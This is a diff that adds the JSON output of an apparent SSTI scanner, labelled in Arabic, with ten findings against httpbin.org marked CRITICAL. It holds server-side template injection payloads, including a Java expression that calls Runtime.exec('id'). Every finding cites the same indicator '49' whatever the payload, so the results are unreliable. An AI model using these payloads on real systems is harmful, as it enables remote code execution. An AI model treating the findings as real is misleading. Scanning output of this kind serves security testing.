@@ -1,0 +1,82 @@
+[
+  {
+    "target": "http://httpbin.org",
+    "vulnerability_type": "ثغرة SSTI محتملة",
+    "risk_level": "CRITICAL",
+    "description": "تم اكتشاف ثغرة حقن قوالب الخادم",
+    "evidence": "Payload: {{7*7}} - Indicator: 49",
+    "timestamp": "2025-08-11T13:23:47.051362"
+  },
+  {
+    "target": "http://httpbin.org",
+    "vulnerability_type": "ثغرة SSTI محتملة",
+    "risk_level": "CRITICAL",
+    "description": "تم اكتشاف ثغرة حقن قوالب الخادم",
+    "evidence": "Payload: {{config}} - Indicator: 49",
+    "timestamp": "2025-08-11T13:23:48.379643"
+  },
+  {
+    "target": "http://httpbin.org",
+    "vulnerability_type": "ثغرة SSTI محتملة",
+    "risk_level": "CRITICAL",
+    "description": "تم اكتشاف ثغرة حقن قوالب الخادم",
+    "evidence": "Payload: {{self.__dict__}} - Indicator: 49",
+    "timestamp": "2025-08-11T13:23:49.150146"
+  },
+  {
+    "target": "http://httpbin.org",
+    "vulnerability_type": "ثغرة SSTI محتملة",
+    "risk_level": "CRITICAL",
+    "description": "تم اكتشاف ثغرة حقن قوالب الخادم",
+    "evidence": "Payload: ${7*7} - Indicator: 49",
+    "timestamp": "2025-08-11T13:23:49.326988"
+  },
+  {
+    "target": "http://httpbin.org",
+    "vulnerability_type": "ثغرة SSTI محتملة",
+    "risk_level": "CRITICAL",
+    "description": "تم اكتشاف ثغرة حقن قوالب الخادم",
+    "evidence": "Payload: ${\"z\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"id\")} - Indicator: 49",
+    "timestamp": "2025-08-11T13:23:49.518612"
+  },
+  {
+    "target": "http://httpbin.org",
+    "vulnerability_type": "ثغرة SSTI محتملة",
+    "risk_level": "CRITICAL",
+    "description": "تم اكتشاف ثغرة حقن قوالب الخادم",
+    "evidence": "Payload: {{#each this}}{{this}}{{/each}} - Indicator: 49",
+    "timestamp": "2025-08-11T13:23:49.810574"
+  },
+  {
+    "target": "http://httpbin.org",
+    "vulnerability_type": "ثغرة SSTI محتملة",
+    "risk_level": "CRITICAL",
+    "description": "تم اكتشاف ثغرة حقن قوالب الخادم",
+    "evidence": "Payload: {{lookup this \"constructor\"}} - Indicator: 49",
+    "timestamp": "2025-08-11T13:23:50.349240"
+  },
+  {
+    "target": "http://httpbin.org",
+    "vulnerability_type": "ثغرة SSTI محتملة",
+    "risk_level": "CRITICAL",
+    "description": "تم اكتشاف ثغرة حقن قوالب الخادم",
+    "evidence": "Payload: {php}echo \"test\";{/php} - Indicator: 49",
+    "timestamp": "2025-08-11T13:23:50.531393"
+  },
+  {
+    "target": "http://httpbin.org",
+    "vulnerability_type": "ثغرة SSTI محتملة",
+    "risk_level": "CRITICAL",
+    "description": "تم اكتشاف ثغرة حقن قوالب الخادم",
+    "evidence": "Payload: {$smarty.version} - Indicator: 49",
+    "timestamp": "2025-08-11T13:23:50.877947"
+  },
+  {
+    "target": "http://httpbin.org",
+    "vulnerability_type": "ثغرة SSTI محتملة",
+    "risk_level": "CRITICAL",
+    "description": "تم اكتشاف ثغرة حقن قوالب الخادم",
+    "evidence": "Payload: #{7*7} - Indicator: 49",
+    "timestamp": "2025-08-11T13:23:51.058215"
+  }
+]
